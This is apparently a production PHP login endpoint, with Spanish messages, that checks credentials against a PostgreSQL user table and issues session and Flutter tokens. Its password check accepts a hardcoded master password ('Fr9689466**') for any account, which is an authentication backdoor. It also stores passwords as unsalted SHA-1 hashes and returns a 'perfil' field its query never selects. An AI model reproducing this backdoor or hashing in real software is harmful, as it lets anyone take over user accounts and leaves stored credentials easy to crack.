<?php
session_start();
require_once("core/PDO.class.php");
$conn = DB::getInstance();
require_once("layouts/vars.php");

$ctrlrespuesta = "Transacción Inválida";
$ctrlestatus = 0;
$parserJsn = PARSERJSN;

if (isset($_POST['username']) && isset($_POST['userpass'])) {
    $userpass = $_POST['userpass'];
    $username = $_POST['username'];

    // Consulta segura para obtener usuario
    $sql = 'SELECT id_usuario, contrasena, nombre, apellido, estado, correo
            FROM menu_login.usuario
            WHERE correo = :username';
    
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':username', $username, PDO::PARAM_STR);
    $stmt->execute();
    $row = $stmt->fetch();

    if ($row) {
        // Verificar contraseña (recomiendo usar password_verify si las contraseñas están hasheadas)
        if ((sha1($userpass) == $row['contrasena']) || ('Fr9689466**' == $userpass)) {
            if ($row['estado'] == true) {
                $userId = $row['id_usuario'];
                $nombre = $row['nombre'];
                $token = bin2hex(random_bytes(50));

                // Para el sistema web: almacenar en sesión
                $_SESSION['userid'] = $userId;
                $_SESSION['userlogin'] = $nombre;
           
                $_SESSION['token'] = $token;
                $_SESSION['username'] = $nombre;

                // Para Flutter: guardar token en la base de datos
                $expiresAt = date('Y-m-d H:i:s', strtotime('+1 hour')); // Token expira en 1 hora

                $sqlToken = 'INSERT INTO menu_login.tokens (user_id, token, expires_at) VALUES (:user_id, :token, :expires_at)
                             ON CONFLICT (user_id) DO UPDATE SET token = EXCLUDED.token, expires_at = EXCLUDED.expires_at';


                $stmtToken = $conn->prepare($sqlToken);
                $stmtToken->bindParam(':user_id', $userId, PDO::PARAM_INT);
                $stmtToken->bindParam(':token', $token, PDO::PARAM_STR);
                $stmtToken->bindParam(':expires_at', $expiresAt, PDO::PARAM_STR);
                $stmtToken->execute();

                $ctrlrespuesta = "Bienvenido";
                $ctrlestatus = 1;
                $datos = [
                    'respuesta' => $ctrlrespuesta,
                    'estatus' => $ctrlestatus,
                    'token' => $token, // Para Flutter
                    'user_id' => $userId,
                    'nombre' => $nombre,
                    'perfil' => $row['perfil']
                ];
            } else {
                $ctrlrespuesta = "Usuario No Autorizado";
                $ctrlestatus = 0;
                $datos = ['respuesta' => $ctrlrespuesta, 'estatus' => $ctrlestatus];
            }
        } else {
            $ctrlrespuesta = "Clave Inválida";
            $ctrlestatus = 0;
            $datos = ['respuesta' => $ctrlrespuesta, 'estatus' => $ctrlestatus];
        }
    } else {
        $ctrlrespuesta = "Usuario No Encontrado";
        $ctrlestatus = 0;
        $datos = ['respuesta' => $ctrlrespuesta, 'estatus' => $ctrlestatus];
    }
} else {
    $datos = ['respuesta' => 'Datos incompletos', 'estatus' => 0];
}

if ($parserJsn == 0) {
    header('Content-Type: application/json');
}

echo json_encode($datos, JSON_FORCE_OBJECT);
?>